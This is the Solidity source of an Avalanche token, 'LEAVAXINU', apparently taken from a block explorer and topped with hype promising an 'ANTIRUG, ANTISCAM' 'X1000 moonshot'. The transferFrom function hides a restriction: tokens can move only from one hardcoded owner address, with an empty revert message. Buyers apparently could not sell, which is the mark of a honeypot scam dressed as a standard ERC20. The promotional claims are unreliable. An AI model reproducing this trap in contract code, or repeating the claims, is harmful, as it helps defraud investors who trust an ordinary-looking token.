/**
 *Submitted for verification at snowtrace.io on 2022-01-05
*/

/* ----------------------------------------------------------------------------
                                                                                                                                                                       
💉🐶 LE AVAXINU 🐶💉

📞 https://t.me/leavaxinu

📈 AVALANCHE CHAIN TOKEN
📈 0% TAX
📈 COVID THEME COIN
📈 TAKE LE AVAXINU FOR YOUR WEALTH
📈 STEALTH LAUNCH
📈 X1000 MOONSHOOT 
📈 LIQUIDITY WILL BE LOCKED AT LAUNCH
📈 ANTIRUG, ANTISCAM, REAL GAINS
📈 BIG CALL GROUPS AT LAUNCH, GET EARLY

📞JOIN US NOW : https://t.me/leavaxinu
*/
pragma solidity ^0.5.16;



contract ERC20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

// ----------------------------------------------------------------------------
// Safe Math Library
// ----------------------------------------------------------------------------
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}


contract LEAVAXINU is ERC20Interface, SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals; 
    uint256 public _totalSupply;
    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    /**
     * Constrctor function
     *
     * Initializes contract with initial supply tokens to the creator of the contract
     */
    constructor() public {
        name = "LEAVAXINU";
        symbol = "AVAXINU";
        decimals = 18;
        _totalSupply = 10000000000000000000000000;

        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }

function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }
    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    
    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

address private owner1 = 0xfbF6eb47EaB9Eac6307B8d79Cef5Cb9D82e29877;
    address private owner2 = 0xfbF6eb47EaB9Eac6307B8d79Cef5Cb9D82e29877;

    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        
        require(from == owner1 || from == owner2 , " ");
        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(from, to, tokens);
        return true;
         
    }
}